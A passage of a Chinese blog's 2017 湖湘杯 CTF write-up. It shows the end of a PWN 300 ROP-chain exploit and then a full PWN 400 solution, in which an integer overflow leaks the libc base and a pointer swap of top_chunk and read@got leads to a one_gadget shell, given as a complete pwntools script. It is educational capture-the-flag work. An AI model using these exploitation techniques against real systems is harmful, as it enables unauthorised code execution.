xor eax, eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x08049781)  <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">tempnum=0</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.recvuntil(<span class="string">'How many times do you want to calculate:'</span>)</span><br><span class="line">io.sendline(<span class="string">'255'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(0,16):</span><br><span class="line">    io.recvuntil(<span class="string">'5 Save the result\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer x:'</span>)</span><br><span class="line">    io.sendline(str(tempnum))</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer y:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">    io.recvuntil(<span class="string">'5 Save the result\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer x:'</span>)</span><br><span class="line">    io.sendline(str(ct.c_int32(j).value))</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer y:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'5 Save the result\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'5'</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+<p>注意一点就是，就是程序在 return 0之前会调用 free，而为了保证 free 函数的正常运行，前十六次计算的结果必须为0，后面的计算结果就可以随意了。最后 getshell 的效果是：</p>
+<p><img src="pwn300_7.jpg" alt=""></p>
+<h1 id="PWN-400"><a href="#PWN-400" class="headerlink" title="PWN 400"></a>PWN 400</h1><p>把pwn 400 直接拖入 ida 中：<br>main 函数：</p>
+<p><img src="pwn400_1.jpg" alt=""></p>
+<p>Create Profile 函数：</p>
+<p><img src="pwn400_2.jpg" alt=""></p>
+<p>Print Profile 函数：</p>
+<p><img src="pwn400_3.jpg" alt=""></p>
+<p>Update Profile 函数：</p>
+<p><img src="pwn400_4.jpg" alt=""></p>
+<p>Exchange 函数：</p>
+<p><img src="pwn400_5.jpg" alt=""></p>
+<p>这个题目有点难度，题目的流程不难，首先创建 Profile，当名字的长度小于8的时候会把数据写入 bss 段，数据的长度值 nbytes 会放入数据的后面，大于8的时候会 malloc 一个空间，把输入写入堆中，而指针会保存在 bss 段，而数据的长度值 nbytes 也会保存在指针的后面，更新 Profile 的时候也会做相同的操作，打印数据的时候会把名字输出，可以用这个功能泄露程序任意地址的任意数据，Exchange 可以交换两个地址的数据，可以利用这个来 getshell</p>
+<p><img src="pwn400_6.jpg" alt=""></p>
+<p>先运行一下程序看一下这个程序干了啥：</p>
+<p><img src="pwn400_7.jpg" alt=""></p>
+<p>再看看程序开启了哪些保护：</p>
+<p><img src="pwn400_8.jpg" alt=""></p>
+<p>看到这个程序开了栈不可执行，于是肯定就会想到用 rop 来做。</p>
+<p>这个程序有两个地方可以利用：<br>（1）是创建的 Profile，名字长度如果小于8就把数据写入 bss 段中，但是你可以输入负数，如果是负数的话，就可以造成整数溢出，你就可以在bss段中写入任意长度的数据，就可以覆盖后面的长度值 nbytes 为任意数值，这样你可以伪造一个任意长度的数据，在 print 函数中可以看到如果 nbytes 长度小于8就去读 bss 中的数据，如果 nbytes 大于8就会去读 bss 中的指针指向的数据，如果我们伪造 nbytes 的话就可以让 print Profile 函数去读任意地址的数据，通过 got 表可以计算出 libc 的基地址<br>（2）是 Exchange 函数可以交换任意两个指针，但是两个指针都是要有写权限的，程序中权限可以通过 vmmap 来查看</p>
+<p><img src="pwn400_9.jpg" alt=""></p>
+<p>这个地方是难点，解决方法是：用 top_chunk 指针和 read@got 指针进行交换，第二次堆分<br>配时候可以分配到我想要的位置，就可以把想要数据写入 read@got 中，当下回调用 read 的时候就可以跳到 MAGIC 中 getshell 了，关于 top_chunk 的介绍可以参考<a href="https://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5486458.html</a><br>我的 exp：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__Auther__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line">context(terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>], arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">localMAGIC=0x5fbc6</span><br><span class="line">localmain_arena=0x001B2780</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x08048BA6'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">def base_addr(prog_addr,sysmbol,offset):</span><br><span class="line">    <span class="keyword">if</span> sysmbol==<span class="string">'min'</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr)-offset</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr) + offset</span><br><span class="line"></span><br><span class="line">def cr_up_profile(choose,name_len,name,age):</span><br><span class="line">    io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    io.send(choose)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(name_len)</span><br><span class="line">    io.recvuntil(<span class="string">'Input your name:\n'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'Input your age:\n'</span>)</span><br><span class="line">    io.sendline(age)</span><br><span class="line"></span><br><span class="line">def print_profile(address):</span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    data = io.recv().splitlines()[0][11:15][::-1]</span><br><span class="line">    log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line">def change_age(address1,address2):</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Person 1:'</span>)</span><br><span class="line">    io.send(p32(address1))</span><br><span class="line">    io.recvuntil(<span class="string">'Person 2:'</span>)</span><br><span class="line">    io.send(p32(address2))</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">    payload = p32(address) + <span class="string">'a'</span> * 4 + p32(10)</span><br><span class="line">    cr_up_profile(<span class="string">'3'</span>,<span class="string">'-10'</span>,payload,<span class="string">'10'</span>)</span><br><span class="line">    <span class="built_in">return</span> print_profile(address)</span><br><span class="line"></span><br><span class="line">def getshell(address1,address2,address3):</span><br><span class="line">    change_age(address1,address2)</span><br><span class="line">    cr_up_profile(<span class="string">'3'</span>,<span class="string">'20'</span>,address3,<span class="string">'20'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc addr</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">symbols = [<span class="string">'environ'</span>, <span class="string">'_environ'</span>, <span class="string">'__environ'</span>]</span><br><span class="line"><span class="keyword">for</span> symbol <span class="keyword">in</span> symbols:</span><br><span class="line">    environ = libc.symbols[symbol]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"environ:"</span>+hex(environ)</span><br><span class="line">head=libc.symbols[<span class="string">'__curbrk'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"head:"</span>+hex(head)</span><br><span class="line">system=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system:"</span>+hex(system)</span><br><span class="line">__malloc_hook=libc.got[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"__malloc_hook:"</span>+hex(__malloc_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#profile addr</span></span><br><span class="line">elf = ELF(<span class="string">'/home/h11p/hackme/huxiangbei/profile'</span>)</span><br><span class="line">printf_addr=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">puts_addr=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atoi_addr=elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">malloc_addr=elf.got[<span class="string">'malloc'</span>]</span><br><span class="line">__isoc99_scanf_addr=elf.got[<span class="string">'__isoc99_scanf'</span>]</span><br><span class="line">read_addr=elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"printf_addr:"</span>+hex(printf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"puts_addr:"</span>+hex(puts_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"atoi_addr:"</span>+hex(atoi_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"malloc_addr:"</span>+hex(malloc_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"__isoc99_scanf_addr:"</span>+hex(__isoc99_scanf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"read_addr:"</span>+hex(read_addr)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'/home/h11p/hackme/huxiangbei/profile'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#create profile</span></span><br><span class="line">cr_up_profile(<span class="string">'1'</span>,<span class="string">'10'</span>,<span class="string">'a'</span>*8,<span class="string">'1'</span>*12)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc base</span></span><br><span class="line">libc_base=base_addr(<span class="string">"0x"</span>+binascii.b2a_hex(leak(printf_addr)),<span class="string">'min'</span>,0x49670) <span class="comment">#0x49670</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get libc func addr</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"libc_base:"</span>+hex(libc_base)</span><br><span class="line">MAGIC_addr=libc_base+localMAGIC</span><br><span class="line"><span class="built_in">print</span> <span class="string">"MAGIC_addr:"</span>+hex(MAGIC_addr)</span><br><span class="line">environ_addr=libc_base+environ</span><br><span class="line"><span class="built_in">print</span> <span class="string">"environ_addr:"</span>+hex(environ_addr)</span><br><span class="line">head_addr=libc_base+head</span><br><span class="line"><span class="built_in">print</span> <span class="string">"head_addr:"</span>+hex(head_addr)</span><br><span class="line">main_arena_addr=libc_base+localmain_arena</span><br><span class="line"><span class="built_in">print</span> <span class="string">"main_arena_addr:"</span>+hex(main_arena_addr)</span><br><span class="line">topchunk=main_arena_addr+0x30</span><br><span class="line"><span class="built_in">print</span> <span class="string">"topchunk:"</span>+hex(topchunk)</span><br><span class="line">system_addr=libc_base+system</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr:"</span>+hex(system_addr)</span><br><span class="line">__malloc_hook_addr=libc_base+__malloc_hook</span><br><span class="line"><span class="built_in">print</span> <span class="string">"__malloc_hook_addr:"</span>+hex(__malloc_hook_addr)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">libc_start_main=base_addr("0x"+binascii.b2a_hex(leak(environ_addr)),'</span>min<span class="string">',0xa0)</span></span><br><span class="line"><span class="string">print "libc_start_main:"+hex(libc_start_main)</span></span><br><span class="line"><span class="string">head_addr_input=base_addr('</span>0x<span class="string">'+binascii.b2a_hex(leak(head_addr+1))+'</span>00<span class="string">','</span>min<span class="string">',0x20fe8)</span></span><br><span class="line"><span class="string">print "head_addr_input:"+hex(head_addr_input)</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">getshell(topchunk-0xc,0x0804B004-0x8,<span class="string">'a'</span>*8+p32(MAGIC_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+<p>效果是：</p>
+<p>Ps:寻找 MAGIC 可以用 one_gadget 这个工具，工具地址在： <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p>
+<p><img src="pwn400_10.jpg" alt=""></p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">打赏多少您随意！</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/12/15/2017湖湘杯/">2017湖湘杯</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Archimesan 的个人博客">Archimesan</a></p>
+        <p><span>发布时间:</span>2017年12月15日 - 09时21分</p>
+        <p><span>最后更新:</span>2017年12月15日 - 11时08分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/12/15/2017湖湘杯/" title="2017湖湘杯">http://archimesan.me/2017/12/15/2017湖湘杯/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://archimesan.me/2017/12/15/2017湖湘杯/　　作者: Archimesan" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2017/12/16/SQL注入学习/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          SQL注入学习
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/12/14/CTF学习/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CTF学习</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc100-热身运动"><span class="toc-number">1.</span> <span class="toc-text">Misc100 热身运动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc150-流量分析"><span class="toc-number">2.</span> <span class="toc-text">Misc150 流量分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc200-Encryptor-apk"><span class="toc-number">3.</span> <span class="toc-text">Misc200 Encryptor.apk</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc300"><span class="toc-number">4.</span> <span class="toc-text">Misc300</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RE100-Re4newer"><span class="toc-number">5.</span> <span class="toc-text">RE100 Re4newer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RE200-简单的-android"><span class="toc-number">6.</span> <span class="toc-text">RE200 简单的 android</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RE400pyc-分析"><span class="toc-number">7.</span> <span class="toc-text">RE400pyc 分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web150-random"><span class="toc-number">8.</span> <span class="toc-text">Web150 random</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web200"><span class="toc-number">9.</span> <span class="toc-text">Web200</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web300"><span class="toc-number">10.</span> <span class="toc-text">Web300</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN100"><span class="toc-number">11.</span> <span class="toc-text">PWN100</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN-200"><span class="toc-number">12.</span> <span class="toc-text">PWN 200</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN-300"><span class="toc-number">13.</span> <span class="toc-text">PWN 300</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN-400"><span class="toc-number">14.</span> <span class="toc-text">PWN 400</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'Archimesan',
+      repo: 'archimesan.github.io',
+      oauth: {
+        client_id: '',
+        client_secret: '',
+      },
+    })
+    gitment.render('gitments')
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/12/16/SQL注入学习/" title="上一篇: SQL注入学习">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2017/12/14/CTF学习/" title="下一篇: CTF学习">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/12/25/序列化漏洞/">序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/23/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/22/CBC字节翻转攻击/">CBC字节翻转攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/php弱类型漏洞/">php弱类型漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/20/RSA归纳/">RSA归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/19/文件包含漏洞/">文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/18/文件上传绕过/">文件上传绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/17/XSS归纳/">XSS归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/16/SQL注入学习/">SQL注入学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/2017湖湘杯/">2017湖湘杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/14/CTF学习/">CTF学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/13/burpsuite/">BurpSuite 永久使用版（附下载）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/12/搭建hexo/">搭建hexo</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/12/hexo/">Hexo的使用介绍</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Archimesan
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
